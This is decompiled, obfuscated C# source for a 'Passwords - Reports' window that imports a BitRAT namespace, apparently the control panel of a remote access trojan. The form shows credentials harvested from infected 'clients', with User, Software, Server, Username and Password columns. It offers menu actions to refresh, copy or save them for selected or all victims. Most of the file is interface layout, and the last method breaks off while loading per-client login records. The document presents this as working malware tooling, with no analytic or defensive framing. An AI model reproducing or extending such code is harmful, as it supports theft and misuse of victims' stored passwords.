﻿using BitRAT;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Zeroit.Framework.Progress;

[DesignerGenerated]
public sealed class fCredentialsLogins : Form
{
    private IContainer icontainer_0;
    private Timer timer_0;
    private OLVColumn olvcolumn_0;
    private ContextMenuStrip contextMenuStrip_0;
    private ToolStripSeparator toolStripSeparator_0;
    private ToolStripMenuItem toolStripMenuItem_0;
    private FastObjectListView fastObjectListView_0;
    private ToolStripMenuItem toolStripMenuItem_1;
    private ToolStripMenuItem toolStripMenuItem_2;
    private ToolStripMenuItem toolStripMenuItem_3;
    private ToolStripMenuItem toolStripMenuItem_4;
    private ToolStripSeparator toolStripSeparator_1;
    private ToolStripMenuItem toolStripMenuItem_5;
    private ToolStripMenuItem toolStripMenuItem_6;
    private ToolStripSeparator toolStripSeparator_2;
    private ToolStripMenuItem toolStripMenuItem_7;
    private OLVColumn olvcolumn_1;
    private ToolStripMenuItem toolStripMenuItem_8;
    private ToolStripMenuItem toolStripMenuItem_9;
    private ToolStripSeparator toolStripSeparator_3;
    private ToolStripMenuItem toolStripMenuItem_10;
    private ToolStripSeparator toolStripSeparator_4;
    private ToolStripMenuItem toolStripMenuItem_11;
    private ToolStripSeparator toolStripSeparator_5;
    private ToolStripMenuItem toolStripMenuItem_12;
    private ToolStripSeparator toolStripSeparator_6;
    private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_0;
    private FastObjectListView fastObjectListView_1;
    private OLVColumn olvcolumn_2;
    private OLVColumn olvcolumn_3;
    private OLVColumn olvcolumn_4;
    private OLVColumn olvcolumn_5;
    private OLVColumn olvcolumn_6;
    private OLVColumn olvcolumn_7;
    private StatusStrip statusStrip_0;
    private ToolStripStatusLabel toolStripStatusLabel_0;
    private ToolStripProgressBar toolStripProgressBar_0;
    private ContextMenuStrip contextMenuStrip_1;
    private ToolStripMenuItem toolStripMenuItem_13;
    private ToolStripMenuItem toolStripMenuItem_14;
    private ToolStripSeparator toolStripSeparator_7;
    private ToolStripMenuItem toolStripMenuItem_15;
    private Timer timer_1;
    private ToolStripMenuItem toolStripMenuItem_16;
    private ToolStripMenuItem toolStripMenuItem_17;
    private ToolStripMenuItem toolStripMenuItem_18;
    private ToolStripMenuItem toolStripMenuItem_19;
    private ToolStripMenuItem toolStripMenuItem_20;
    private ToolStripMenuItem toolStripMenuItem_21;
    private ToolStripMenuItem toolStripMenuItem_22;
    private ToolStripSeparator toolStripSeparator_8;
    private ToolStripStatusLabel toolStripStatusLabel_1;
    private ToolStripStatusLabel toolStripStatusLabel_2;
    private StatusStrip statusStrip_1;
    private ToolStripStatusLabel toolStripStatusLabel_3;
    private ToolStripStatusLabel toolStripStatusLabel_4;
    private ToolStripMenuItem toolStripMenuItem_23;
    private ToolStripSeparator toolStripSeparator_9;
    private ToolStripSeparator toolStripSeparator_10;
    private ToolStripMenuItem toolStripMenuItem_24;
    private ToolStripMenuItem toolStripMenuItem_25;
    private ToolStripSeparator toolStripSeparator_11;
    private ToolStripMenuItem toolStripMenuItem_26;

    public fCredentialsLogins()
    {
        base.Load += new EventHandler(this.fCredentialsLogins_Load);
        base.Resize += new EventHandler(this.fCredentialsLogins_Resize);
        base.Closing += new CancelEventHandler(this.fCredentialsLogins_Closing);
        this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
        if (disposing && (this.icontainer_0 != null))
        {
            this.icontainer_0.Dispose();
        }
    }

    private void fCredentialsLogins_Closing(object sender, CancelEventArgs e)
    {
        base.Visible = false;
        e.Cancel = true;
    }

    private void fCredentialsLogins_Load(object sender, EventArgs e)
    {
        this.method_0();
    }

    private void fCredentialsLogins_Resize(object sender, EventArgs e)
    {
        this.vmethod_10().get_Columns()[0].Width = this.vmethod_10().Width - 180;
        this.vmethod_10().get_Columns()[1].Width = 150;
        int num = (int) Math.Round(Conversion.Val(((double) this.vmethod_52().Width) / 6.0));
        this.vmethod_52().get_Columns()[0].Width = num - 10;
        this.vmethod_52().get_Columns()[1].Width = num - 10;
        this.vmethod_52().get_Columns()[2].Width = num - 10;
        this.vmethod_52().get_Columns()[3].Width = num - 10;
        this.vmethod_52().get_Columns()[4].Width = num - 10;
        this.vmethod_52().get_Columns()[5].Width = num - 10;
        this.vmethod_50().Left = (int) Math.Round((double) ((this.vmethod_52().Left + (((double) this.vmethod_52().Width) / 2.0)) - (this.vmethod_50().Left + (((double) this.vmethod_50().Width) / 2.0))));
        this.vmethod_50().Top = (int) Math.Round((double) ((this.vmethod_52().Top + (((double) this.vmethod_52().Height) / 2.0)) - (this.vmethod_50().Top + (((double) this.vmethod_50().Height) / 2.0))));
        this.vmethod_50().Update();
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
        this.icontainer_0 = new Container();
        ComponentResourceManager manager = new ComponentResourceManager(typeof(fCredentialsLogins));
        RectangleParemeters paremeters = new RectangleParemeters();
        this.vmethod_1(new Timer(this.icontainer_0));
        this.vmethod_3(new OLVColumn());
        this.vmethod_5(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_13(new ToolStripMenuItem());
        this.vmethod_17(new ToolStripMenuItem());
        this.vmethod_49(new ToolStripSeparator());
        this.vmethod_15(new ToolStripMenuItem());
        this.vmethod_7(new ToolStripSeparator());
        this.vmethod_9(new ToolStripMenuItem());
        this.vmethod_33(new ToolStripMenuItem());
        this.vmethod_39(new ToolStripMenuItem());
        this.vmethod_37(new ToolStripSeparator());
        this.vmethod_35(new ToolStripMenuItem());
        this.vmethod_21(new ToolStripSeparator());
        this.vmethod_23(new ToolStripMenuItem());
        this.vmethod_29(new ToolStripMenuItem());
        this.vmethod_27(new ToolStripSeparator());
        this.vmethod_25(new ToolStripMenuItem());
        this.vmethod_41(new ToolStripSeparator());
        this.vmethod_111(new ToolStripMenuItem());
        this.vmethod_113(new ToolStripSeparator());
        this.vmethod_19(new ToolStripMenuItem());
        this.vmethod_47(new ToolStripMenuItem());
        this.vmethod_45(new ToolStripSeparator());
        this.vmethod_43(new ToolStripMenuItem());
        this.vmethod_11(new FastObjectListView());
        this.vmethod_31(new OLVColumn());
        this.vmethod_51(new ZeroitAnidasoCircleProgress());
        this.vmethod_53(new FastObjectListView());
        this.vmethod_55(new OLVColumn());
        this.vmethod_57(new OLVColumn());
        this.vmethod_59(new OLVColumn());
        this.vmethod_61(new OLVColumn());
        this.vmethod_63(new OLVColumn());
        this.vmethod_65(new OLVColumn());
        this.vmethod_73(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_75(new ToolStripMenuItem());
        this.vmethod_85(new ToolStripMenuItem());
        this.vmethod_87(new ToolStripMenuItem());
        this.vmethod_89(new ToolStripMenuItem());
        this.vmethod_91(new ToolStripMenuItem());
        this.vmethod_93(new ToolStripMenuItem());
        this.vmethod_95(new ToolStripMenuItem());
        this.vmethod_97(new ToolStripMenuItem());
        this.vmethod_99(new ToolStripSeparator());
        this.vmethod_77(new ToolStripMenuItem());
        this.vmethod_79(new ToolStripSeparator());
        this.vmethod_81(new ToolStripMenuItem());
        this.vmethod_115(new ToolStripSeparator());
        this.vmethod_117(new ToolStripMenuItem());
        this.vmethod_119(new ToolStripMenuItem());
        this.vmethod_121(new ToolStripSeparator());
        this.vmethod_123(new ToolStripMenuItem());
        this.vmethod_67(new StatusStrip());
        this.vmethod_69(new ToolStripStatusLabel());
        this.vmethod_109(new ToolStripStatusLabel());
        this.vmethod_103(new ToolStripStatusLabel());
        this.vmethod_71(new ToolStripProgressBar());
        this.vmethod_83(new Timer(this.icontainer_0));
        this.vmethod_101(new ToolStripStatusLabel());
        this.vmethod_105(new StatusStrip());
        this.vmethod_107(new ToolStripStatusLabel());
        this.vmethod_4().SuspendLayout();
        this.vmethod_10().BeginInit();
        this.vmethod_52().BeginInit();
        this.vmethod_72().SuspendLayout();
        this.vmethod_66().SuspendLayout();
        this.vmethod_104().SuspendLayout();
        base.SuspendLayout();
        this.vmethod_0().Enabled = true;
        this.vmethod_0().Interval = 0x3e8;
        this.vmethod_2().set_AspectName("USER");
        this.vmethod_2().set_Hideable(false);
        this.vmethod_2().Text = "User";
        this.vmethod_4().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] toolStripItems = new ToolStripItem[] { this.vmethod_12(), this.vmethod_6(), this.vmethod_8() };
        this.vmethod_4().Items.AddRange(toolStripItems);
        this.vmethod_4().Name = "ContextMenuStrip1";
        this.vmethod_4().Size = new Size(0x85, 0x36);
        ToolStripItem[] itemArray2 = new ToolStripItem[] { this.vmethod_16(), this.vmethod_48(), this.vmethod_14() };
        this.vmethod_12().DropDownItems.AddRange(itemArray2);
        this.vmethod_12().Name = "RefreshToolStripMenuItem";
        this.vmethod_12().Size = new Size(0x84, 0x16);
        this.vmethod_12().Text = "Refresh";
        this.vmethod_16().Name = "RefreshSelectedClientsToolStripMenuItem";
        this.vmethod_16().Size = new Size(0x9b, 0x16);
        this.vmethod_16().Text = "Selected clients";
        this.vmethod_48().Name = "ToolStripMenuItem10";
        this.vmethod_48().Size = new Size(0x98, 6);
        this.vmethod_14().Name = "RefreshAllClientsToolStripMenuItem";
        this.vmethod_14().Size = new Size(0x9b, 0x16);
        this.vmethod_14().Text = "All clients";
        this.vmethod_6().Name = "ToolStripMenuItem3";
        this.vmethod_6().Size = new Size(0x81, 6);
        ToolStripItem[] itemArray3 = new ToolStripItem[] { this.vmethod_32(), this.vmethod_20(), this.vmethod_22(), this.vmethod_40(), this.vmethod_110(), this.vmethod_112(), this.vmethod_18() };
        this.vmethod_8().DropDownItems.AddRange(itemArray3);
        this.vmethod_8().Name = "OperationsToolStripMenuItem";
        this.vmethod_8().Size = new Size(0x84, 0x16);
        this.vmethod_8().Text = "Operations";
        ToolStripItem[] itemArray4 = new ToolStripItem[] { this.vmethod_38(), this.vmethod_36(), this.vmethod_34() };
        this.vmethod_32().DropDownItems.AddRange(itemArray4);
        this.vmethod_32().Name = "ViewToolStripMenuItem";
        this.vmethod_32().Size = new Size(0xa9, 0x16);
        this.vmethod_32().Text = "View";
        this.vmethod_38().Name = "ViewSelectedToolStripMenuItem";
        this.vmethod_38().Size = new Size(0x76, 0x16);
        this.vmethod_38().Text = "Selected";
        this.vmethod_36().Name = "ToolStripMenuItem5";
        this.vmethod_36().Size = new Size(0x73, 6);
        this.vmethod_34().Name = "ViewAllToolStripMenuItem";
        this.vmethod_34().Size = new Size(0x76, 0x16);
        this.vmethod_34().Text = "All";
        this.vmethod_20().Name = "ToolStripMenuItem1";
        this.vmethod_20().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray5 = new ToolStripItem[] { this.vmethod_28(), this.vmethod_26(), this.vmethod_24() };
        this.vmethod_22().DropDownItems.AddRange(itemArray5);
        this.vmethod_22().Name = "CopyToClipboardToolStripMenuItem";
        this.vmethod_22().Size = new Size(0xa9, 0x16);
        this.vmethod_22().Text = "Copy to clipboard";
        this.vmethod_28().Name = "CopySelectedToolStripMenuItem";
        this.vmethod_28().Size = new Size(0x76, 0x16);
        this.vmethod_28().Text = "Selected";
        this.vmethod_26().Name = "ToolStripMenuItem4";
        this.vmethod_26().Size = new Size(0x73, 6);
        this.vmethod_24().Name = "CopyAllToolStripMenuItem";
        this.vmethod_24().Size = new Size(0x76, 0x16);
        this.vmethod_24().Text = "All";
        this.vmethod_40().Name = "ToolStripMenuItem6";
        this.vmethod_40().Size = new Size(0xa6, 6);
        this.vmethod_110().Name = "ClearListsToolStripMenuItem";
        this.vmethod_110().Size = new Size(0xa9, 0x16);
        this.vmethod_110().Text = "Clear lists";
        this.vmethod_112().Name = "ToolStripMenuItem8";
        this.vmethod_112().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray6 = new ToolStripItem[] { this.vmethod_46(), this.vmethod_44(), this.vmethod_42() };
        this.vmethod_18().DropDownItems.AddRange(itemArray6);
        this.vmethod_18().Name = "SavetofileToolStripMenuItem";
        this.vmethod_18().Size = new Size(0xa9, 0x16);
        this.vmethod_18().Text = "Save to file";
        this.vmethod_46().Name = "SaveSelectedToolStripMenuItem";
        this.vmethod_46().Size = new Size(0x76, 0x16);
        this.vmethod_46().Text = "Selected";
        this.vmethod_44().Name = "ToolStripMenuItem7";
        this.vmethod_44().Size = new Size(0x73, 6);
        this.vmethod_42().Name = "SaveAllToolStripMenuItem";
        this.vmethod_42().Size = new Size(0x76, 0x16);
        this.vmethod_42().Text = "All";
        this.vmethod_10().Alignment = ListViewAlignment.Left;
        this.vmethod_10().get_AllColumns().Add(this.vmethod_2());
        this.vmethod_10().get_AllColumns().Add(this.vmethod_30());
        this.vmethod_10().Anchor = AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_10().AutoArrange = false;
        this.vmethod_10().BorderStyle = BorderStyle.None;
        this.vmethod_10().set_CellEditUseWholeCell(false);
        ColumnHeader[] values = new ColumnHeader[] { this.vmethod_2(), this.vmethod_30() };
        this.vmethod_10().get_Columns().AddRange(values);
        this.vmethod_10().ContextMenuStrip = this.vmethod_4();
        this.vmethod_10().Cursor = Cursors.Default;
        this.vmethod_10().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_10().FullRowSelect = true;
        this.vmethod_10().HeaderStyle = ColumnHeaderStyle.Nonclickable;
        this.vmethod_10().HideSelection = false;
        this.vmethod_10().Location = new Point(0, 1);
        this.vmethod_10().Margin = new Padding(1);
        this.vmethod_10().Name = "lvCredentialsUsers";
        this.vmethod_10().set_ShowGroups(false);
        this.vmethod_10().Size = new Size(0x107, 560);
        this.vmethod_10().TabIndex = 0x3d;
        this.vmethod_10().UseCompatibleStateImageBehavior = false;
        this.vmethod_10().set_UseHotControls(false);
        this.vmethod_10().set_UseOverlays(false);
        this.vmethod_10().set_View(View.Details);
        this.vmethod_10().VirtualMode = true;
        this.vmethod_30().set_AspectName("LOGINS");
        this.vmethod_30().set_Hideable(false);
        this.vmethod_30().Text = "Logins";
        this.vmethod_50().set_Animated(true);
        this.vmethod_50().set_AnimationInterval(0);
        this.vmethod_50().set_AnimationSpeed(1);
        this.vmethod_50().BackColor = SystemColors.Control;
        this.vmethod_50().BackgroundImage = (Image) manager.GetObject("pbProgress.BackgroundImage");
        this.vmethod_50().Font = new Font("Microsoft Sans Serif", 22f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_50().ForeColor = Color.Black;
        this.vmethod_50().set_LineProgressThickness(8);
        this.vmethod_50().set_LineThickness(10);
        this.vmethod_50().Location = new Point(0x227, 200);
        this.vmethod_50().Margin = new Padding(15, 12, 15, 12);
        this.vmethod_50().set_MaximumValue(0x3e8);
        this.vmethod_50().Name = "pbProgress";
        this.vmethod_50().set_ProgressBackColor(Color.Gainsboro);
        this.vmethod_50().set_ProgressColor(Color.LightBlue);
        paremeters.set_HeightShift(20);
        paremeters.set_HorizontalShift(10);
        paremeters.set_VerticalShift(10);
        paremeters.set_WidthShift(20);
        this.vmethod_50().set_Rectangle(paremeters);
        this.vmethod_50().set_ShowText(false);
        this.vmethod_50().Size = new Size(0x9e, 0x9e);
        this.vmethod_50().TabIndex = 0x41;
        this.vmethod_50().set_Value(0);
        this.vmethod_50().Visible = false;
        this.vmethod_52().Alignment = ListViewAlignment.Left;
        this.vmethod_52().get_AllColumns().Add(this.vmethod_54());
        this.vmethod_52().get_AllColumns().Add(this.vmethod_56());
        this.vmethod_52().get_AllColumns().Add(this.vmethod_58());
        this.vmethod_52().get_AllColumns().Add(this.vmethod_60());
        this.vmethod_52().get_AllColumns().Add(this.vmethod_62());
        this.vmethod_52().get_AllColumns().Add(this.vmethod_64());
        this.vmethod_52().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_52().AutoArrange = false;
        this.vmethod_52().BackColor = Color.White;
        this.vmethod_52().BorderStyle = BorderStyle.None;
        this.vmethod_52().set_CellEditUseWholeCell(false);
        ColumnHeader[] headerArray2 = new ColumnHeader[] { this.vmethod_54(), this.vmethod_56(), this.vmethod_58(), this.vmethod_60(), this.vmethod_62(), this.vmethod_64() };
        this.vmethod_52().get_Columns().AddRange(headerArray2);
        this.vmethod_52().ContextMenuStrip = this.vmethod_72();
        this.vmethod_52().Cursor = Cursors.Default;
        this.vmethod_52().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_52().FullRowSelect = true;
        this.vmethod_52().HeaderStyle = ColumnHeaderStyle.Nonclickable;
        this.vmethod_52().HideSelection = false;
        this.vmethod_52().Location = new Point(0x10a, 1);
        this.vmethod_52().Margin = new Padding(1);
        this.vmethod_52().Name = "lvCredentialsLogins";
        this.vmethod_52().set_ShowGroups(false);
        this.vmethod_52().Size = new Size(680, 560);
        this.vmethod_52().TabIndex = 0x40;
        this.vmethod_52().UseCompatibleStateImageBehavior = false;
        this.vmethod_52().set_UseHotControls(false);
        this.vmethod_52().set_UseOverlays(false);
        this.vmethod_52().set_View(View.Details);
        this.vmethod_52().VirtualMode = true;
        this.vmethod_54().set_AspectName("USER");
        this.vmethod_54().set_Hideable(false);
        this.vmethod_54().set_IsEditable(false);
        this.vmethod_54().set_Searchable(false);
        this.vmethod_54().Text = "User";
        this.vmethod_56().set_AspectName("TYPE");
        this.vmethod_56().set_Hideable(false);
        this.vmethod_56().set_IsEditable(false);
        this.vmethod_56().set_Searchable(false);
        this.vmethod_56().Text = "Type";
        this.vmethod_58().set_AspectName("SOFTWARE");
        this.vmethod_58().set_Hideable(false);
        this.vmethod_58().set_IsEditable(false);
        this.vmethod_58().set_Searchable(false);
        this.vmethod_58().Text = "Software";
        this.vmethod_60().set_AspectName("SERVER");
        this.vmethod_60().set_Hideable(false);
        this.vmethod_60().set_IsEditable(false);
        this.vmethod_60().set_Searchable(false);
        this.vmethod_60().Text = "Server";
        this.vmethod_62().set_AspectName("USERNAME");
        this.vmethod_62().set_Hideable(false);
        this.vmethod_62().set_IsEditable(false);
        this.vmethod_62().set_Searchable(false);
        this.vmethod_62().Text = "Username";
        this.vmethod_64().set_AspectName("PASSWORD");
        this.vmethod_64().set_Hideable(false);
        this.vmethod_64().set_IsEditable(false);
        this.vmethod_64().set_Searchable(false);
        this.vmethod_64().Text = "Password";
        this.vmethod_72().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray7 = new ToolStripItem[] { this.vmethod_74(), this.vmethod_114(), this.vmethod_116() };
        this.vmethod_72().Items.AddRange(itemArray7);
        this.vmethod_72().Name = "ContextMenuStrip1";
        this.vmethod_72().Size = new Size(170, 0x36);
        ToolStripItem[] itemArray8 = new ToolStripItem[] { this.vmethod_84(), this.vmethod_98(), this.vmethod_76(), this.vmethod_78(), this.vmethod_80() };
        this.vmethod_74().DropDownItems.AddRange(itemArray8);
        this.vmethod_74().Name = "ClipboardToolStripMenuItem";
        this.vmethod_74().Size = new Size(0xa9, 0x16);
        this.vmethod_74().Text = "Copy to clipboard";
        ToolStripItem[] itemArray9 = new ToolStripItem[] { this.vmethod_86(), this.vmethod_88(), this.vmethod_90(), this.vmethod_92(), this.vmethod_94(), this.vmethod_96() };
        this.vmethod_84().DropDownItems.AddRange(itemArray9);
        this.vmethod_84().Name = "ColumnToolStripMenuItem";
        this.vmethod_84().Size = new Size(0x76, 0x16);
        this.vmethod_84().Text = "Column";
        this.vmethod_86().Name = "UserToolStripMenuItem";
        this.vmethod_86().Size = new Size(0x7f, 0x16);
        this.vmethod_86().Text = "User";
        this.vmethod_88().Name = "TypeToolStripMenuItem";
        this.vmethod_88().Size = new Size(0x7f, 0x16);
        this.vmethod_88().Text = "Type";
        this.vmethod_90().Name = "SoftwareToolStripMenuItem";
        this.vmethod_90().Size = new Size(0x7f, 0x16);
        this.vmethod_90().Text = "Software";
        this.vmethod_92().Name = "ServerToolStripMenuItem";
        this.vmethod_92().Size = new Size(0x7f, 0x16);
        this.vmethod_92().Text = "Server";
        this.vmethod_94().Name = "UsernameToolStripMenuItem";
        this.vmethod_94().Size = new Size(0x7f, 0x16);
        this.vmethod_94().Text = "Username";
        this.vmethod_96().Name = "PasswordToolStripMenuItem";
        this.vmethod_96().Size = new Size(0x7f, 0x16);
        this.vmethod_96().Text = "Password";
        this.vmethod_98().Name = "ToolStripMenuItem2";
        this.vmethod_98().Size = new Size(0x73, 6);
        this.vmethod_76().Name = "SelectedToolStripMenuItem";
        this.vmethod_76().Size = new Size(0x76, 0x16);
        this.vmethod_76().Text = "Selected";
        this.vmethod_78().Name = "ToolStripSeparator1";
        this.vmethod_78().Size = new Size(0x73, 6);
        this.vmethod_80().Name = "AllToolStripMenuItem";
        this.vmethod_80().Size = new Size(0x76, 0x16);
        this.vmethod_80().Text = "All";
        this.vmethod_114().Name = "ToolStripMenuItem9";
        this.vmethod_114().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray10 = new ToolStripItem[] { this.vmethod_118(), this.vmethod_120(), this.vmethod_122() };
        this.vmethod_116().DropDownItems.AddRange(itemArray10);
        this.vmethod_116().Name = "SaveToFileToolStripMenuItem1";
        this.vmethod_116().Size = new Size(0xa9, 0x16);
        this.vmethod_116().Text = "Save to file";
        this.vmethod_118().Name = "SelectedToolStripMenuItem1";
        this.vmethod_118().Size = new Size(0x76, 0x16);
        this.vmethod_118().Text = "Selected";
        this.vmethod_120().Name = "ToolStripMenuItem11";
        this.vmethod_120().Size = new Size(0x73, 6);
        this.vmethod_122().Name = "AllToolStripMenuItem1";
        this.vmethod_122().Size = new Size(0x76, 0x16);
        this.vmethod_122().Text = "All";
        this.vmethod_66().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_66().AutoSize = false;
        this.vmethod_66().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_66().Dock = DockStyle.None;
        this.vmethod_66().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] itemArray11 = new ToolStripItem[] { this.vmethod_68(), this.vmethod_108(), this.vmethod_102(), this.vmethod_70() };
        this.vmethod_66().Items.AddRange(itemArray11);
        this.vmethod_66().Location = new Point(0x10b, 0x233);
        this.vmethod_66().Name = "ssCredentialsLoginsViewer";
        this.vmethod_66().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_66().Size = new Size(0x2a1, 0x13);
        this.vmethod_66().SizingGrip = false;
        this.vmethod_66().Stretch = false;
        this.vmethod_66().TabIndex = 0x42;
        this.vmethod_66().Text = "stStatus";
        this.vmethod_68().AutoSize = false;
        this.vmethod_68().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_68().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_68().Margin = new Padding(-2, 4, 0, 0);
        this.vmethod_68().Name = "tsLogins";
        this.vmethod_68().Size = new Size(0x59, 15);
        this.vmethod_68().Spring = true;
        this.vmethod_68().Text = "Logins: N/A";
        this.vmethod_68().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_108().AutoSize = false;
        this.vmethod_108().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_108().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_108().Margin = new Padding(0, 4, 0, 0);
        this.vmethod_108().Name = "tsCredentialsLoginsTotal";
        this.vmethod_108().Size = new Size(250, 15);
        this.vmethod_108().Text = "Total logins: 0";
        this.vmethod_108().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_102().AutoSize = false;
        this.vmethod_102().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_102().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_102().Margin = new Padding(0, 4, 0, 0);
        this.vmethod_102().Name = "tsCredentialsSelected";
        this.vmethod_102().Size = new Size(250, 15);
        this.vmethod_102().Text = "Selected clients: 0";
        this.vmethod_102().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_70().Alignment = ToolStripItemAlignment.Right;
        this.vmethod_70().ForeColor = Color.FromArgb(0xc0, 0xc0, 0);
        this.vmethod_70().Margin = new Padding(2, 4, -6, 2);
        this.vmethod_70().Maximum = 0x3e8;
        this.vmethod_70().Name = "tsProgress";
        this.vmethod_70().Size = new Size(0x52, 13);
        this.vmethod_70().Step = 1;
        this.vmethod_70().Style = ProgressBarStyle.Continuous;
        this.vmethod_82().Enabled = true;
        this.vmethod_82().Interval = 0x3e8;
        this.vmethod_100().Name = "ToolStripStatusLabel1";
        this.vmethod_100().Size = new Size(180, 0x19);
        this.vmethod_100().Text = "ToolStripStatusLabel1";
        this.vmethod_104().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_104().AutoSize = false;
        this.vmethod_104().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_104().Dock = DockStyle.None;
        this.vmethod_104().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] itemArray12 = new ToolStripItem[] { this.vmethod_106() };
        this.vmethod_104().Items.AddRange(itemArray12);
        this.vmethod_104().Location = new Point(0, 0x233);
        this.vmethod_104().Name = "ssCredentialsReports";
        this.vmethod_104().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_104().Size = new Size(0x107, 0x13);
        this.vmethod_104().SizingGrip = false;
        this.vmethod_104().Stretch = false;
        this.vmethod_104().TabIndex = 70;
        this.vmethod_104().Text = "stStatus";
        this.vmethod_106().AutoSize = false;
        this.vmethod_106().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_106().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_106().Margin = new Padding(0, 4, -10, 0);
        this.vmethod_106().Name = "tsCredentialsReports";
        this.vmethod_106().Size = new Size(0x109, 15);
        this.vmethod_106().Spring = true;
        this.vmethod_106().Text = "Users: 0";
        this.vmethod_106().TextAlign = ContentAlignment.TopLeft;
        base.AutoScaleDimensions = new SizeF(6f, 13f);
        base.AutoScaleMode = AutoScaleMode.Font;
        base.ClientSize = new Size(0x3b1, 0x248);
        base.Controls.Add(this.vmethod_104());
        base.Controls.Add(this.vmethod_66());
        base.Controls.Add(this.vmethod_50());
        base.Controls.Add(this.vmethod_10());
        base.Controls.Add(this.vmethod_52());
        this.DoubleBuffered = true;
        base.Margin = new Padding(2);
        base.Name = "fCredentialsLogins";
        base.Opacity = 0.0;
        base.ShowIcon = false;
        base.ShowInTaskbar = false;
        base.StartPosition = FormStartPosition.CenterParent;
        this.Text = "Passwords - Reports";
        this.vmethod_4().ResumeLayout(false);
        this.vmethod_10().EndInit();
        this.vmethod_52().EndInit();
        this.vmethod_72().ResumeLayout(false);
        this.vmethod_66().ResumeLayout(false);
        this.vmethod_66().PerformLayout();
        this.vmethod_104().ResumeLayout(false);
        this.vmethod_104().PerformLayout();
        base.ResumeLayout(false);
    }

    public void method_0()
    {
        base.Width = 0x3c1;
        base.Height = 0x26f;
        this.vmethod_10().VirtualMode = true;
        this.vmethod_10().set_View(View.Details);
        this.vmethod_10().FullRowSelect = true;
        this.vmethod_10().set_OwnerDraw(true);
        this.vmethod_10().set_UseCellFormatEvents(true);
        this.vmethod_10().GridLines = Class135.smethod_0().Gridlines;
        this.vmethod_52().VirtualMode = true;
        this.vmethod_52().set_View(View.Details);
        this.vmethod_52().FullRowSelect = true;
        this.vmethod_52().set_OwnerDraw(true);
        this.vmethod_52().set_UseCellFormatEvents(true);
        this.vmethod_52().Enabled = false;
        this.vmethod_52().GridLines = Class135.smethod_0().Gridlines;
        this.vmethod_50().set_Value(0);
        this.vmethod_50().Left = (int) Math.Round((double) ((this.vmethod_52().Left + (((double) this.vmethod_52().Width) / 2.0)) - (this.vmethod_50().Left + (((double) this.vmethod_50().Width) / 2.0))));
        this.vmethod_50().Top = (int) Math.Round((double) ((this.vmethod_52().Top + (((double) this.vmethod_52().Height) / 2.0)) - (this.vmethod_50().Top + (((double) this.vmethod_50().Height) / 2.0))));
        this.vmethod_50().set_ShowText(true);
    }

    public void method_1()
    {
        if (this.vmethod_52().InvokeRequired)
        {
            this.vmethod_52().Invoke(new Delegate77(this.method_2), new object[0]);
        }
        else
        {
            long num;
            this.vmethod_52().Enabled = false;
            this.vmethod_52().ClearObjects();
            this.vmethod_52().Update();
            ConcurrentStack<cCredentialsLogin> source = new ConcurrentStack<cCredentialsLogin>();
            this.vmethod_70().Value = 0;
            this.vmethod_50().set_Value(0);
            FastObjectListView view = Class130.fCredentialsLogins_0.vmethod_10();
            if (view.get_SelectedObjects() != null)
            {
                IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
                while (enumerator.MoveNext())
                {
                    cCredentialsUser current = (cCredentialsUser) enumerator.Current;
                    num = (long) Math.Round((double) (num + Conversions.ToDouble(current.LOGINS)));
                }
            }
            view = null;
            if (num != 0)
            {
                this.vmethod_70().Maximum = (int) num;
                this.vmethod_50().set_MaximumValue((int) num);
                this.vmethod_50().Visible = true;
                FastObjectListView view2 = Class130.fCredentialsLogins_0.vmethod_10();
                if (view2.get_SelectedObjects() != null)
                {
                    IEnumerator enumerator = view2.get_SelectedObjects().GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        cCredentialsUser current = (cCredentialsUser) enumerator.Current;
                        IEnumerator enumerator3 = current.xmlList.GetEnumerator();
                        while (true)
                        {
                            if (!enumerator3.MoveNext())
                            {
                                Application.DoEvents();
                                break;
                            }
                            XmlNode node = (XmlNode) enumerator3.Current;
                            cCredentialsLogin item = new cCredentialsLogin();
                            item.Key = current.Key;
